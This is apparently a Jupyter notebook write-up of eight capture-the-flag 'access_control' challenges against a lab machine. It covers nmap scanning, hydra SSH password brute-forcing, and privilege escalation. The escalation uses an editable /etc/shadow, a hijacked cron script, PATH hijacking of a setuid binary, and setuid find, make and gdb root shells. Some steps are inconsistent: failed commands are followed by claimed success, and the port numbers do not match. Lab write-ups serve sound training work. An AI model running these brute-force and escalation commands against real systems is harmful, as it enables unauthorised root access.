# access_control_0

#### 1. Discover the machines which are online on the network (10.0.0.0/24):

In [4]:
! nmap -sn 10.0.0.0/24 | grep "report for" | cut -d " " -f 5

10.0.0.1
10.0.0.79


#### 2. The first IP is the router, so 10.0.0.79 is the online machine. Discover the services that the machine is exposing:

In [5]:
! nmap -p- 10.0.0.79

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-11 07:32 EDT
Nmap scan report for 10.0.0.79
Host is up (0.00012s latency).
Not shown: 65526 closed tcp ports (conn-refused)
PORT     STATE SERVICE
22/tcp   open  ssh
2220/tcp open  netiq
2221/tcp open  rockwell-csp1
2222/tcp open  EtherNetIP-1
2223/tcp open  rockwell-csp2
2224/tcp open  efi-mg
2225/tcp open  rcip-itu
2226/tcp open  di-drm
2227/tcp open  di-msg

Nmap done: 1 IP address (1 host up) scanned in 1.32 seconds


#### 3. Know the services that are in the ports different from 22:

In [7]:
! nmap -p 2220,2221,2222,2223,2224,2225,2226,2227 -sV 10.0.0.79

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-11 07:36 EDT
Nmap scan report for 10.0.0.79
Host is up (0.00037s latency).

PORT     STATE SERVICE VERSION
2220/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
2221/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
2222/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
2223/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
2224/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
2225/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
2226/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
2227/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 0.28 seconds


#### 4. As they are all SSH servers and "student" is a known user, find if he uses a weak password:

First, discover where the common wordlist "rockyou.txt" is located, as we don't have other wordlist

In [8]:
! locate rockyou.txt

/usr/share/wordlists/rockyou.txt.gz


Now use hydra to crack the password

In [9]:
! hydra -l student -P /usr/share/wordlists/rockyou.txt.gz -s 2220 -o hydra_result_ssh_student.txt -t 8 -m / -vV 10.0.0.79 ssh

Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-03-11 07:43:19
[DATA] max 8 tasks per 1 server, overall 8 tasks, 14344399 login tries (l:1/p:14344399), ~1793050 tries per task
[DATA] attacking ssh://10.0.0.79:2222/
[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
[INFO] Testing if password authentication is supported by ssh://student@10.0.0.79:2222
[INFO] Successful, password authentication is supported by ssh://10.0.0.79:2222
[ATTEMPT] target 10.0.0.79 - login "student" - pass "123456" - 1 of 14344399 [child 0] (0/0)
[ATTEMPT] target 10.0.0.79 - login "student" - pass "12345" - 2 of 14344399 [child 1] (0/0)
[ATTEMPT] target 10.0.0.79 - login "student" - pass "123456789" - 3 of 14344399 [child 2] (0/0)
[ATTEMPT] target 10.0.0.79 - login "student" - pa

#### 5. Have access to the machine using SSH with the user "student" and the password discovered:

In [1]:
! ssh -p 2220 student@10.0.0.79

ssh: connect to host 10.0.0.79 port 2220: Connection timed out


#### 6. We are inside the machine, so we try to scale privileges with basic comands:

In [ ]:
! sudo su

This works, we are root inside the machine so access the root directory and get the flag

In [ ]:
! cd root

In [ ]:
! cat flag

flag:sFZusbckO7wmhIVs

# access_control_1

We do the same commands as previously but instead of use the ssh with port 2220, we use 2221

In [ ]:
! ssh -p 2221 student@10.0.0.79

#### 1. Try the same as before:

In [ ]:
! sudo su

#### 2. As the student is not part of the sudoers list, try to add it:

In [ ]:
! cd ..

In [ ]:
! cd ..

In [ ]:
! ls -al

This will give the list of all the directories of the internal configuration

In [ ]:
! cd etc

In [ ]:
! ls -al

In this list of directories, "shadow" is in green color so we try to access it and discover we don't need administrator priviledge to edit it

In [ ]:
! vim shadow

Copy the hash of the password for student in the place of the password of root, so this will be the new root password

In [ ]:
root:$y$j9T$teWIwsbHPGfHe.Q8RrV911$Wu8wEFtlHGS6wd6ZiI3diKT/0G0ZrFYmRq1BvsS9Q8C:19793:0:99999:7:::

#### 3. Now it is possible to login as root qith the same password as the one for "student":

In [ ]:
! su -

After this command, the requested password is the one for "student"After this command, the requested password is the one for "student" and we are inside the machine as root, so get the flag

In [3]:
! cat flag

cat: flag: No such file or directory


flag:M1J3KwvzTaSlCNqa

# access_control_2

We do the same commands as previously but instead of use the ssh with port 2221, we use 2222

In [ ]:
! ssh -p 2222 student@10.0.0.79

#### 1. Try the same as before:

In [ ]:
! sudo su

#### 2. As the student is not part of the sudoers list, try to add it:

In [ ]:
! cd ..

In [ ]:
! cd ..

In [ ]:
! ls -al

This will give the list of all the directories of the internal configuration

In [ ]:
! cd sbin

In [ ]:
! ls

Looking some of the directories, inside sbin there are many files that do not need root permissions and in particular "shadowconfig" looks interesting

In [ ]:
! cat shadowconfig

After reading the bash script, we know that when executed, it activates/desactivates the passwords in the shadow file

#### 3. Execute the shadowconfig in order to turn off the password for login as root

In [ ]:
! ./shadowconfig 

#### 4. Last, login as root with the ssh service:

In [ ]:
! ssh -p 2222 root@10.0.0.79

Now we are inside the machine as root so just get the flag

In [4]:
! cat flag

cat: flag: No such file or directory


flag:upecq5wuAfo7UflM

# access_control_3

We do the same commands as previously but instead of use the ssh with port 2222, we use 2223

#### 1. Try the same as before:

In [ ]:
! sudo su

#### 2. As the student is not part of the sudoers list, try to add it:

In [ ]:
! cd ..

In [ ]:
! cd ..

In [ ]:
! ls -al

This will give the list of all the directories of the internal configuration

In [ ]:
! cd etc

In [ ]:
! ls

Inside this directory, there is a bash script named: "secret.sh"

In [ ]:
! cat secret.sh

The function of this script is: generate a random number, convert it into an MD5 hash, take the first 20 characters of that hash, and then discard them: so apparently it is unuseful for now but we can change its content in order to do another thing more useful

#!/bin/bash 

sudo usermod -aG sudo student

In [ ]:
! ./secret.sh

Now we have added the user student to sudoers, so it is possible to give us privileges of root and just have to wait until the cron executes the process of secret.sh as root

In [ ]:
! su - student

We put the password and should be able to execute sudo

In [ ]:
! sudo su -

Now we are inside the machine as root so only obtain the flag

In [ ]:
! cat flag

flag:DCF52Cfv94TofurP

# access_control_4

We do the same commands as previously but instead of use the ssh with port 2223, we use 2224

#### 1. Try the same as before:

In [ ]:
! sudo su

#### 2. As the student is not part of the sudoers list, try to add it:

In [ ]:
! cd ..

In [ ]:
! cd ..

In [ ]:
! ls -al

This will give the list of all the directories of the internal configuration

In [ ]:
! cd usr/bin

In [ ]:
! ls

Inside this directory, there is the command "find" thas is configured with the bit setuid established

In [ ]:
! ./find

In [ ]:
! /usr/bin/find / -exec /bin/bash -p \; -quit

Try to use the command find that has root privileges to execute a shell with root privileges and inside this terminal access the directory "root" to obtain the flag

In [2]:
! cd root

zsh:cd:1: no such file or directory: root


In [ ]:
! cat flag

flag:jQfExITCWGqfg8o3

# access_control_5

We do the same commands as previously but instead of use the ssh with port 2224, we use 2225

#### 1. Try the same as before:

In [ ]:
! sudo su

#### 2. As the student is not part of the sudoers list, try to add it:

In [ ]:
! cd ..

In [ ]:
! cd ..

In [ ]:
! ls -al

This will give the list of all the directories of the internal configuration

In [ ]:
! cd etc

In [ ]:
! ls

Inside this directory, there is other file named "updater" in color red, what means it is configured with the bit setuid established

In [ ]:
! ./updater

This file gives the following lines:

Hit:1 http://deb.debian.org/debian bookworm InRelease
Hit:2 http://deb.debian.org/debian bookworm-updates InRelease
Hit:3 http://deb.debian.org/debian-security bookworm-security InRelease
Reading package lists... Done
Building dependency tree... Done
Reading state information... Done
All packages are up to date.
Reading package lists... Done
Building dependency tree... Done
Reading state information... Done
Calculating upgrade... Done
0 upgraded, 0 newly installed, 0 to remove and 0 not upgraded.

So we can see the main code in c in the file updater.c and bring clarity: the program searches for the first directory in which it is said "apt" so we create one in our user home and give it permissions to make updater use that one

In [ ]:
! vi apt

In [ ]:
! chmod +x apt

The content inside apt in order to give student permissions is:

#!/bin/bash 

sudo usermod -aG sudo student

In [ ]:
! su - student

We put the password and should be able to execute sudo

In [ ]:
! sudo su -

Now we are inside the machine as root so only access the directory "root" to obtain the flag

In [2]:
! cd root

zsh:cd:1: no such file or directory: root


In [ ]:
! cat flag

flag:GXZItfUrqSobVVWi

# access_control_6

We do the same commands as previously but instead of use the ssh with port 2225, we use 2226

#### 1. Try the same as before:

In [ ]:
! sudo su

#### 2. As the student is not part of the sudoers list, try to add it:

In [ ]:
! cd ..

In [ ]:
! cd ..

In [ ]:
! ls -al

This will give the list of all the directories of the internal configuration

In [ ]:
! cd usr/bin

In [ ]:
! ls

Inside this directory, we can see that "make" is configured with the bit setuid established, so go to the principal directory of the student and create a Makefile in order to execute make with a rule that let us open a root terminal 

In [ ]:
! cd home/student

In [ ]:
! echo "all: ; /bin/bash -p" > ~/Makefile

Then, use make from the original directory but using the created Makefile

In [ ]:
! cd ~
/usr/bin/make

! cd ..

In [ ]:
! cd root

In [ ]:
! cat flag

flag:Q7l1uI91Jyut9YwT

# access_control_7

We do the same commands as previously but instead of use the ssh with port 2226, we use 2227

#### 1. Try the same as before:

In [ ]:
! sudo su

#### 2. As the student is not part of the sudoers list, try to add it:

In [ ]:
! cd ..

In [ ]:
! cd ..

In [ ]:
! ls -al

This will give the list of all the directories of the internal configuration

In [ ]:
! cd usr/bin

In [ ]:
! ls

Inside this directory we see that we can execute gdb as root as it has the bit suit established so we can use the fact that gdb inherits the privileges of the file executed to get root privileges

In [ ]:
! echo 'import os; os.setuid(0); os.system("/bin/bash")' > /tmp/exploit.py

In [ ]:
! chmod +x /tmp/exploit.py

In [ ]:
! gdb --init-eval-command='set disassembly-flavor intel' -q -ex 'python import sys; sys.path.insert(0, "/tmp/"); import exploit; exit'

Now we are inside the machine as root so access the directory "root" to obtain the flag

In [2]:
! cd root

zsh:cd:1: no such file or directory: root


In [ ]:
! cat flag

flag:HBxYtfTGkVyqbTQB